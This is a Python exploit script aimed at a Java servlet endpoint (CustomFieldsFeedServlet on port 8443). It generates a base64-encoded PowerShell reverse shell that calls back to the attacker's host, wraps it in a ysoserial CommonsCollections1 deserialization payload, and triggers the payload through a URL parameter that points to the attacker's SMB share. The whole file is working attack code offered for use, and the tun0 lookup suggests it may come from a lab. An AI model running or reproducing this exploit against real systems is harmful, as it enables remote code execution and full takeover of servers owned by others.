import sys, re, os
import requests
import subprocess
import base64
requests.packages.urllib3.disable_warnings()

def generate_shellcode(LHOST, LPORT):
	command = f"$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
	
	encoded = base64.b64encode(command.encode("utf-16le"))
	encoded = encoded.decode()

	return f"powershell -e {encoded}"

def generate_payload(LHOST, LPORT):
	dest_command = generate_shellcode(LHOST, LPORT)

	command = f"java -jar ysoserial-all.jar CommonsCollections1 \'{dest_command}\' > payload"
	print(command)
	subprocess.run(command, shell=True)

def send_payload(ip, LHOST):
	target = f"https://{ip}:8443/servlet/CustomFieldsFeedServlet"

	filepath = f"\\\\\\\\{LHOST}\\\\share\\\\payload"

	target += f"?customFieldObject={filepath}"
	print(target)
	print()

	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	r = s.get(target, verify=False)
	print(r.text)
	print(r.status_code)

def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = 9001
	
	generate_payload(LHOST, LPORT)

	send_payload(ip, LHOST)

if __name__ == '__main__':
	main()